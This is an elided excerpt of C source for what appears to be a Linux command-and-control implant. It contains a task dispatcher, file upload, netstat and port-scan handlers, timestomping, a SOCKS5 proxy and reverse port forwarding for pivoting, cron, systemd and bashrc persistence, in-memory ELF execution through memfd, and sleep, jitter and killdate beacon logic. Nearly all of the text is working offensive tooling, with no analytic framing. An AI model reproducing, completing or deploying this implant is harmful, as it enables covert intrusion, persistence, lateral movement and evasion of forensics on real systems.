...
static struct {
    socks_conn_t conns[SOCKS_MAX_CONNS];
    uint32_t     conn_count;
    int          active;
    int          saved_sleep;
} g_socks;
...
static void cmd_uptime_handler(const char *task_uuid) {
    ...
    if (!fp) {
        queue_response(task_uuid, RSP_ERROR, "cannot read /proc/uptime");
        return;
    }
    double up_secs = 0;
...
static void cmd_getuid(const char *task_uuid) {
    ...
    if (getgroups(ngroups, groups) >= 0) {
        ...
        if (ngroups > 0) {
            ...
            for (int i = 0; i < ngroups && len < sizeof(buf) - 16; i++) {
                len += (size_t)snprintf(buf + len, sizeof(buf) - len, " %d", groups[i]);
            }
        }
    }
...
static void cmd_timestomp_handler(const char *task_uuid, parser_t *params) {
...
static void cmd_config_handler(const char *task_uuid, parser_t *params) {
    ...
    /* skip spawnto fields (Windows-only) */
    ...
    if (sleep_ms != 0xFFFFFFFF) {
        g_sleep_interval = (int)(sleep_ms / 1000);
        if (g_sleep_interval < 1) g_sleep_interval = 1;
    }
    if (jitter != 0xFFFFFFFF) {
        g_sleep_jitter = (int)jitter;
    }
    if (killdate != 0xFFFFFFFF) {
        g_killdate = killdate;
    }

    char msg[256];
    snprintf(msg, sizeof(msg), "sleep=%ds jitter=%d%% killdate=%u", g_sleep_interval, g_sleep_jitter, g_killdate);
    queue_response(task_uuid, RSP_SUCCESS, msg);
}
...
static void cmd_upload_handler(const char *task_uuid, parser_t *params) {
    ...
    FILE *fp = NULL;
    if (chunk_num == 1) {
        fp = fopen(remote_path, "wb");
    } else {
        fp = fopen(remote_path, "ab");
    }

    if (!fp) {
        char err[512];
        snprintf(err, sizeof(err), "fopen(%s): %s", remote_path, strerror(errno));
        queue_response(task_uuid, RSP_ERROR, err);
    ...
    if (chunk_num >= total_chunks) {
        char msg[512];
        snprintf(msg, sizeof(msg), "uploaded %s (%u chunks)", remote_path, total_chunks);
        queue_response(task_uuid, RSP_SUCCESS, msg);
    } else {
        /* request next chunk */
        packer_t p;
...
static void cmd_netstat_handler(const char *task_uuid) {
    ...
    for (int pi = 0; paths[pi]; pi++) {
        ...
        while (fgets(line, sizeof(line), fp)) {
            unsigned int local_addr, remote_addr, state, uid_val;
            ...
            if (proc_dir && inode > 0) {
                ...
                while ((de = readdir(proc_dir)) != NULL) {
                    int p_id = atoi(de->d_name);
                    if (p_id <= 0) continue;
                    char fd_dir[64];
                    snprintf(fd_dir, sizeof(fd_dir), "/proc/%d/fd", p_id);
                    DIR *fd_d = opendir(fd_dir);
                    if (!fd_d) continue;
                    struct dirent *fde;
                    while ((fde = readdir(fd_d)) != NULL) {
                        char fd_path[128], link_buf[128];
                        snprintf(fd_path, sizeof(fd_path), "%s/%s", fd_dir, fde->d_name);
                        ssize_t rn = readlink(fd_path, link_buf, sizeof(link_buf) - 1);
                        if (rn > 0) {
                            link_buf[rn] = '\0';
                            unsigned long fd_inode;
                            if (sscanf(link_buf, "socket:[%lu]", &fd_inode) == 1 && fd_inode == inode) {
                                pid = p_id;
                                break;
                            }
                        }
            ...
            unsigned char *ra = (unsigned char *)&remote_addr;
            ...
            char entry[256];
            int elen = snprintf(entry, sizeof(entry), "%-6s %-23s %-23s %-12s %-8d\n",
                                protos[pi], local_str, remote_str, state_str, pid);
...
static void cmd_portscan_handler(const char *task_uuid, parser_t *params) {
    ...
    /* parse hosts (comma-separated or CIDR - simple comma for now) */
    ...
    while (host_tok) {
        ...
        while (port_tok) {
            ...
            if (dash) {
                *dash = '\0';
                port_start = atoi(port_tok);
                port_end = atoi(dash + 1);
            } else {
                port_start = port_end = atoi(port_tok);
            }
            ...
            for (int port = port_start; port <= port_end; port++) {
                ...
                if (getaddrinfo(host_tok, port_s, &hints, &res) != 0 || !res)
                    continue;
    ...
    buf[len] = '\0';
    if (len == 0) {
        queue_response(task_uuid, RSP_SUCCESS, "no open ports found");
    } else {
        queue_response(task_uuid, RSP_SUCCESS, buf);
    }
    free(buf);
    free(hosts_str); free(ports_str);
}

/* ======== SOCKS5 PROXY ======== */

static void socks_queue_response(uint32_t server_id, uint8_t *data, uint32_t data_len, int do_exit) {
    packer_t p;
    pk_init(&p);
    pk_byte(&p, ACTION_SOCKS_MSG);
...
static socks_conn_t *socks_find(uint32_t server_id) {
    for (uint32_t i = 0; i < g_socks.conn_count; i++) {
        if (g_socks.conns[i].active && g_socks.conns[i].server_id == server_id)
            return &g_socks.conns[i];
    }
    return NULL;
}

static socks_conn_t *socks_alloc(uint32_t server_id) {
    for (uint32_t i = 0; i < SOCKS_MAX_CONNS; i++) {
        if (!g_socks.conns[i].active) {
            g_socks.conns[i].server_id = server_id;
            g_socks.conns[i].sock = -1;
            g_socks.conns[i].active = 1;
            g_socks.conns[i].connected = 0;
            if (i >= g_socks.conn_count) g_socks.conn_count = i + 1;
            return &g_socks.conns[i];
        }
    }
    return NULL;
...
static void socks_close(socks_conn_t *conn) {
    if (conn->sock >= 0) {
        close(conn->sock);
        conn->sock = -1;
    }
...
static void socks_route(uint32_t server_id, uint8_t *data, uint32_t data_len, int do_exit) {
    socks_conn_t *conn = socks_find(server_id);

    if (do_exit) {
        if (conn) {
            socks_close(conn);
            socks_queue_response(server_id, NULL, 0, 1);
        }
        return;
    }

    if (!conn) {
        conn = socks_alloc(server_id);
        if (!conn) {
            socks_queue_response(server_id, NULL, 0, 1);
            return;
        }
    ...
    if (!conn->connected && data && data_len >= 3 && data[0] == 0x05) {
        /* distinguish greeting from connect request:
         * greeting: [0x05, nmethods, methods...]  - data[1] is nmethods (>= 1)
         * connect:  [0x05, cmd, rsv, atyp, ...]   - data[1] is 0x01/0x02/0x03 */
        ...
        if (!is_connect) {
            ...
            socks_queue_response(server_id, greeting_rsp, 2, 0);
            return;
        }
        ...
        if (is_connect) {
            ...
            if (cmd != 0x01) { /* only CONNECT supported */
                ...
                socks_queue_response(server_id, fail, 10, 0);
                socks_close(conn);
                return;
            }
            ...
            } else if (atyp == 0x04 && data_len >= 22) { /* IPv6 */
                snprintf(host, sizeof(host), "[::1]"); /* simplified */
            ...
            socks_queue_response(server_id, ok, 10, 0);

#ifdef DEBUG_BUILD
            fprintf(stderr, "[socks] connected server_id=%u to %s:%u\n", server_id, host, port);
#endif
            return;
        }
    }
...
static void socks_poll(void) {
    if (!g_socks.active) return;

    uint8_t buf[SOCKS_RECV_BUF];
    for (uint32_t i = 0; i < g_socks.conn_count; i++) {
        socks_conn_t *conn = &g_socks.conns[i];
        if (!conn->active || !conn->connected) continue;

        ssize_t n = recv(conn->sock, buf, sizeof(buf), 0);
        if (n > 0) {
            socks_queue_response(conn->server_id, buf, (uint32_t)n, 0);
        } else if (n == 0) {
            socks_close(conn);
            socks_queue_response(conn->server_id, NULL, 0, 1);
...
static void socks_destroy(void) {
    for (uint32_t i = 0; i < g_socks.conn_count; i++) {
        if (g_socks.conns[i].active) socks_close(&g_socks.conns[i]);
    }
    g_socks.active = 0;
    g_socks.conn_count = 0;
    g_sleep_interval = g_socks.saved_sleep;
}

static void cmd_socks_handler(const char *task_uuid, parser_t *params) {
    ...
    if (strcmp(action, "start") == 0) {
        if (g_socks.active) {
            ...
            g_socks.active = 1;
            g_socks.saved_sleep = g_sleep_interval;
            g_sleep_interval = 0;
...
static void cmd_persist_cron(const char *task_uuid, parser_t *params) {
    char *action = pr_string(params);
...
static void cmd_persist_systemd(const char *task_uuid, parser_t *params) {
    char *action = pr_string(params);
...
static void cmd_persist_bashrc(const char *task_uuid, parser_t *params) {
    char *action = pr_string(params);
    char *command = pr_string(params);
...
static void cmd_memfd_exec(const char *task_uuid, parser_t *params) {
    uint32_t elf_len;
...
static void dispatch_task(uint8_t cmd_id, const char *task_uuid,
    ...
    switch (cmd_id) {
        ...
        case CMD_KILL:
            ...
            break;
        case CMD_UPLOAD:
            cmd_upload_handler(task_uuid, &params);
            break;
        case CMD_CONFIG:
            cmd_config_handler(task_uuid, &params);
            break;
        case CMD_DOWNLOAD:
        ...
        case DOWNLOAD_RESP_CMD:
            ...
            break;
        case CMD_NETSTAT:
            cmd_netstat_handler(task_uuid);
            break;
        case CMD_TIMESTOMP:
            cmd_timestomp_handler(task_uuid, &params);
            break;
        case CMD_LOCALTIME:
            cmd_localtime(task_uuid);
            break;
        case CMD_GETUID:
            cmd_getuid(task_uuid);
            break;
        case CMD_UPTIME:
            cmd_uptime_handler(task_uuid);
            break;
        case CMD_RPFWD:
            cmd_rpfwd_handler(task_uuid, &params);
            break;
        case CMD_SOCKS:
            cmd_socks_handler(task_uuid, &params);
            break;
        case CMD_PORTSCAN:
            cmd_portscan_handler(task_uuid, &params);
            break;
        case CMD_PERSIST_CRON:
            cmd_persist_cron(task_uuid, &params);
            break;
        case CMD_PERSIST_SYSTEMD:
            cmd_persist_systemd(task_uuid, &params);
            break;
        case CMD_PERSIST_BASHRC:
            cmd_persist_bashrc(task_uuid, &params);
            break;
        case CMD_MEMFD_EXEC:
            cmd_memfd_exec(task_uuid, &params);
            break;
        default: {
            char msg[64];
...
static void do_get_tasking(void) {
    /* poll rpfwd and socks connections before building request */
    if (g_rpfwd.active) rpfwd_poll();
    if (g_socks.active) socks_poll();
    ...
    /* parse additional sections (rpfwd/socks datagrams) */
    while (pr_remaining(&rp) > 0) {
        ...
        } else if (section_action == ACTION_SOCKS_MSG && g_socks.active) {
            uint32_t socks_count = pr_int32(&rp);
...
int main(int argc, char **argv) {
    ...
    while (g_running) {
        /* killdate check */
        if (g_killdate > 0 && (uint32_t)time(NULL) >= g_killdate) {
            g_running = 0;
            break;
        }
        ...
        if (s == 0) {
            usleep(50000); /* 50ms poll interval for rpfwd/socks/proxy mode */
        } else {
            if (g_sleep_jitter > 0) {
